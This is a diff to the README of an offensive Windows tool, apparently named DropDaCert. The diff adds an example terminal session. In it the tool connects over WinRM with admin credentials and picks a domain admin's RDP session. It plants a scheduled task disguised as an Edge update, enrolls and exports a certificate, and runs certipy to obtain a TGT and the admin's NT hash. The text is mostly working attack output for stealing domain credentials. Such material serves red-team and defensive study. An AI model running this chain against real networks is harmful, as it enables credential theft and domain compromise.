@@ -4,6 +4,43 @@ ADCS certificate theft via scheduled task session hijacking.
 
 Drops a scheduled task on a target that runs in an active user's session context (`InteractiveToken`), enrolls a certificate via `certreq`, exports the PFX, and runs `certipy auth` to extract the NT hash.
 
+```
+┌──(kali㉿kali)-[~/DropDaCert]
+└─$ python3 DropDaCert.py administrator:'P@ssw0rd'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
+
+  DropDaCert v2.0
+
+  [+] Resolving target: 10.0.0.5
+  [+] Target: SRV01.corp.local (10.0.0.5)
+  [+] Connecting via WinRM (NTLM)...
+  [+] Connected
+
+  #    State    Session              User
+  ---- -------- -------------------- ------------------------------
+  0    Active   rdp-tcp#0            CORP\jsmith
+  1    Active   rdp-tcp#1            CORP\admin-da
+
+  [?] Pick session # to target: 1
+
+  [+] Target session: CORP\admin-da (session 3, Active)
+  [+] Payload uploaded
+  [+] Task 'MicrosoftEdgeUpdateCore' created
+  [+] Task triggered
+  [+] Waiting for PFX (timeout: 90s)...........
+  [+] PFX saved: output/cert.pfx (3286 bytes)
+
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'admin-da@corp.local'
+[*] Using principal: 'admin-da@corp.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'admin-da.ccache'
+[*] Trying to retrieve NT hash for 'admin-da'
+[*] Got hash for 'admin-da@corp.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
+```
+
 ## Install
 
 ```bash
